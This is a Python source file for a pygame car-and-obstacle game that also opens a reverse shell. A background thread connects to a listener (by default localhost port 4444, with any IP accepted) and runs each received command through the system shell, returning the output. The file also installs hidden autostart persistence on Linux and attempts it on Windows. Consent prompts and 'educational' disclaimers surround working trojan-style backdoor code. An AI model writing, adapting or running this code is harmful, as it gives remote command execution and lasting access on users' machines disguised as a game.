import os
import sys
import subprocess
import platform
import random
import time
import shutil
import getpass
import pygame
import socket
import threading
import warnings
GAME_NAME = "CarMovementGame"
DEPENDENCIES = ["pygame"] 
LOG_FILE = "shell_log.txt"
CLEANUP_SCRIPT = "cleanup.py"
WINDOW_WIDTH, WINDOW_HEIGHT = 800, 600
CAR_SPEED = 5
NETCAT_LISTENER_IP = "127.0.0.1" 
NETCAT_LISTENER_PORT = 4444  
OBSTACLE_SPEED = 3 
OBSTACLE_SPAWN_RATE = 60  
OBSTACLE_WIDTH, OBSTACLE_HEIGHT = 40, 40  
MIN_SPAWN_RATE = 10  

def check_dependencies():
    """Simulate checking and installing dependencies."""
    print("Checking for required dependencies...")
    for dep in DEPENDENCIES:
        try:
            __import__(dep)
            print(f"Dependency '{dep}' is already installed.")
        except ImportError:
            print(f"Dependency '{dep}' not found. Simulating installation...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", dep])
                print(f"Dependency '{dep}' installed successfully.")
            except subprocess.CalledProcessError:
                print(f"Failed to install '{dep}'. Please install it manually.")
                sys.exit(1)

    system = platform.system()
    try:
        if system == "Windows":
            subprocess.check_call(["where", "ncat"])
        else: 
            subprocess.check_call(["which", "nc"])
        print("Netcat is already installed.")
    except subprocess.CalledProcessError:
        print("Netcat not found. Please install Netcat manually:")
        if system == "Windows":
            print("  Download from a trusted source (e.g., Nmap project) and add to PATH.")
        else:  
            print("  Run 'sudo apt install netcat' (Debian/Ubuntu) or equivalent.")
        sys.exit(1)

def notify_user(listener_ip):
    """Notify the user about what will happen."""
    print(f"Welcome to {GAME_NAME}!")
    print("DISCLAIMER: This game is for educational purposes only.")
    print("Running this game will:")
    print("1. Check and install required dependencies.")
    print("2. Simulate a backdoor by logging system commands to a file.")
    print(f"3. Provide shell access using Netcat to a listener at {listener_ip}:{NETCAT_LISTENER_PORT} (for educational purposes only).")
    print("4. Add persistence to your system (reversible).")
    print("\nWARNING: This game will allow the listener to execute commands on your system.")
    print("This feature is for educational demonstration only and should only be used in a controlled, consensual environment.")
    print("Do not run this on real systems or public networks without explicit permission.")
    consent = input("Do you consent to proceed? (y/n): ").lower()
    if consent != "y":
        print("User did not consent. Exiting...")
        sys.exit(0)

def provide_shell_access_with_netcat(listener_ip, listener_port):
    while True:
        """Provide shell access using Netcat by executing commands from the listener."""
        system = platform.system()
        log_entry = f"[{time.ctime()}] Providing shell access using Netcat on {system}:\n"
        with open(LOG_FILE, "a") as log:
            log.write(log_entry)
        print(f"Starting Netcat shell access to {listener_ip}:{listener_port}...")

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((listener_ip, listener_port))
                log_entry = f"[{time.ctime()}] Connected to Netcat listener at {listener_ip}:{listener_port}\n"
                with open(LOG_FILE, "a") as log:
                    log.write(log_entry)
                print(f"Connected to Netcat listener at {listener_ip}:{listener_port}")

                while True:
                    command = s.recv(1024).decode().strip()
                    if not command:
                        break 
                    if command.lower() == "exit":
                        break  

                    log_entry = f"[{time.ctime()}] Received command: {command}\n"
                    with open(LOG_FILE, "a") as log:
                        log.write(log_entry)

                    try:
                        if system == "Windows":
                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                        else:  
                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    except subprocess.CalledProcessError as e:
                        output = f"Error executing command: {e.output}"
                    except Exception as e:
                        output = f"Error: {str(e)}"

                    log_entry = f"[{time.ctime()}] Command output: {output}\n"
                    with open(LOG_FILE, "a") as log:
                        log.write(log_entry)

                    s.sendall(output.encode())

        except ConnectionRefusedError:
            print(f"Warning: Could not connect to Netcat listener at {listener_ip}:{listener_port}. Ensure the listener is running.")
        except Exception as e:
            print(f"Error during Netcat shell access: {e}")
        finally:
            log_entry = f"[{time.ctime()}] Netcat shell access terminated\n"
            with open(LOG_FILE, "a") as log:
                log.write(log_entry)
            print("Netcat shell access terminated.")

def add_persistence():
    """Simulate persistence by adding the game to startup."""
    print("Adding persistence (for educational purposes)...")
    system = platform.system()
    username = getpass.getuser()
    if system == "Windows":
        startup_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        script_path = os.path.abspath(__file__)
        dest_path = os.path.join(startup_path, f"{GAME_NAME}.py")
        if not dest_path:
            shutil.copy(script_path, dest_path)
        print(f"Persistence added to Windows Startup: {dest_path}")
    elif system == "Linux":
        autostart_path = f"/home/{username}/.config/autostart/"
        os.makedirs(autostart_path, exist_ok=True)
        desktop_entry = f"""
[Desktop Entry]
Type=Application
Name={GAME_NAME}
Exec={sys.executable} {os.path.abspath(__file__)}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
        with open(os.path.join(autostart_path, f"{GAME_NAME}.desktop"), "w") as f:
            f.write(desktop_entry)
        print(f"Persistence added to Linux autostart: {autostart_path}")
    else:
        print("Persistence not supported on this platform.")

def reset_game():
    """Reset the game state for a new game."""
    return {
        "car_x": WINDOW_WIDTH // 2,
        "car_y": WINDOW_HEIGHT // 2,
        "obstacles": [],
        "frame_count": 0,
        "score": 0,
        "spawn_rate": OBSTACLE_SPAWN_RATE,
        "game_over": False
    }

def play_game():
    """Main game loop for car movement with falling obstacles and scoring."""
    pygame.init()
    screen = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))
    pygame.display.set_caption(GAME_NAME)
    clock = pygame.time.Clock()
    font = pygame.font.Font(None, 36)  
  

    game_state = reset_game()
    car_width, car_height = 50, 30
    car_color = (255, 0, 0)  
    obstacle_color = (0, 255, 0)  
    running = True
    while running:
        try:
            if not game_state["game_over"]:
                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        running = False

                keys = pygame.key.get_pressed()
                if keys[pygame.K_LEFT] or keys[pygame.K_a]:
                    game_state["car_x"] -= CAR_SPEED
                if keys[pygame.K_RIGHT] or keys[pygame.K_d]:
                    game_state["car_x"] += CAR_SPEED
                if keys[pygame.K_UP] or keys[pygame.K_w]:
                    game_state["car_y"] -= CAR_SPEED
                if keys[pygame.K_DOWN] or keys[pygame.K_s]:
                    game_state["car_y"] += CAR_SPEED

                game_state["car_x"] = max(0, min(game_state["car_x"], WINDOW_WIDTH - car_width))
                game_state["car_y"] = max(0, min(game_state["car_y"], WINDOW_HEIGHT - car_height))

                game_state["score"] += 1

                game_state["spawn_rate"] = max(MIN_SPAWN_RATE, OBSTACLE_SPAWN_RATE - (game_state["score"] // 100) * 5)

                game_state["frame_count"] += 1
                if game_state["frame_count"] % game_state["spawn_rate"] == 0:
                    obstacle_x = random.randint(0, WINDOW_WIDTH - OBSTACLE_WIDTH)
                    game_state["obstacles"].append([obstacle_x, -OBSTACLE_HEIGHT])

                for obstacle in game_state["obstacles"][:]:
                    obstacle[1] += OBSTACLE_SPEED
                    if obstacle[1] > WINDOW_HEIGHT:
                        game_state["obstacles"].remove(obstacle)

                car_rect = pygame.Rect(game_state["car_x"], game_state["car_y"], car_width, car_height)
                for obstacle in game_state["obstacles"]:
                    obstacle_rect = pygame.Rect(obstacle[0], obstacle[1], OBSTACLE_WIDTH, OBSTACLE_HEIGHT)
                    if car_rect.colliderect(obstacle_rect):
                        game_state["game_over"] = True
                        break

                screen.fill((255, 255, 255))  
                pygame.draw.rect(screen, car_color, (game_state["car_x"], game_state["car_y"], car_width, car_height))
                for obstacle in game_state["obstacles"]:
                    pygame.draw.rect(screen, obstacle_color, (obstacle[0], obstacle[1], OBSTACLE_WIDTH, OBSTACLE_HEIGHT))
                score_text = font.render(f"Score: {game_state['score']}", True, (0, 0, 0))
                screen.blit(score_text, (10, 10))
                
                pygame.display.flip()

            else:  
                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        running = False
                    if event.type == pygame.KEYDOWN and event.key == pygame.K_r:
                        game_state = reset_game()
                screen.fill((0, 0, 0))  
                font_large = pygame.font.Font(None, 74)
                game_over_text = font_large.render("Game Over", True, (255, 0, 0))
                restart_text = font_large.render("Press R to Restart", True, (255, 255, 255))
                final_score_text = font.render(f"Final Score: {game_state['score']}", True, (255, 255, 255))
                screen.blit(game_over_text, (WINDOW_WIDTH // 2 - game_over_text.get_width() // 2, WINDOW_HEIGHT // 2 - 100))
                screen.blit(final_score_text, (WINDOW_WIDTH // 2 - final_score_text.get_width() // 2, WINDOW_HEIGHT // 2))
                screen.blit(restart_text, (WINDOW_WIDTH // 2 - restart_text.get_width() // 2, WINDOW_HEIGHT // 2 + 100))
                pygame.display.flip()

            clock.tick(60)  

        except KeyboardInterrupt:
            print("\nGameplay uninterrupted. Use the window's close button to exit.")
        except Exception as e:
            print(f"An error occurred: {e}. Continuing gameplay...")

    pygame.quit()

def main():
    listener_ip = NETCAT_LISTENER_IP
    override_ip = input(f"Enter the Netcat listener IP (default is {NETCAT_LISTENER_IP} for safety, press Enter to use default): ").strip()
    if override_ip:
        warnings.warn(f"\nWARNING: Using a listener IP other than {NETCAT_LISTENER_IP} may expose your system to external networks.\nThis is for educational purposes only and should only be done in a controlled, consensual environment.\nEnsure you have explicit permission to test on the target system.")
        listener_ip = override_ip
    notify_user(listener_ip)
    check_dependencies()
    add_persistence()
    netcat_thread = threading.Thread(target=provide_shell_access_with_netcat, args=(listener_ip, NETCAT_LISTENER_PORT))
    netcat_thread.start()
    play_game()
    while True:
        netcat_thread.join()

if __name__ == "__main__":
    main()